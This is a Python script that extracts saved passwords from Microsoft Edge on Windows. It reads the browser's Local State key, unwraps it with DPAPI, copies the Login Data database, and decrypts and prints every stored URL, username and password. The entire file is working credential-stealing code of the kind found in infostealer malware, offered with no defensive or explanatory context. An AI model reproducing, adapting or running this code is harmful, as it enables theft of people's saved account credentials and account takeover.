import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES 
import shutil

data_path = os.path.join(os.environ["USERPROFILE"],"AppData","Local","Microsoft","Edge","User Data","Local State")
path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
temp_db = "Loginvault.db"


def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: 
        print(e)
        return None

def get_passwords_edge() -> None | list:
    try:
        with open(data_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except Exception as e:
        return None

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    try: 
        shutil.copy2(path, temp_db)
    except Exception as e:
        print(e)
        exit()
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = []
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, key)
            if username != "" or decrypted_password != "":
                result.append([url,username, decrypted_password])
    except Exception as e:
        print(e)
        exit()
    finally:
        cursor.close()
        conn.close()
    
    try: 
        os.remove(temp_db)
    except Exception as e: 
        print(e)

    return result

if __name__ == "__main__":
    res = get_passwords_edge()
    if res:
        for p in res:
            print(p)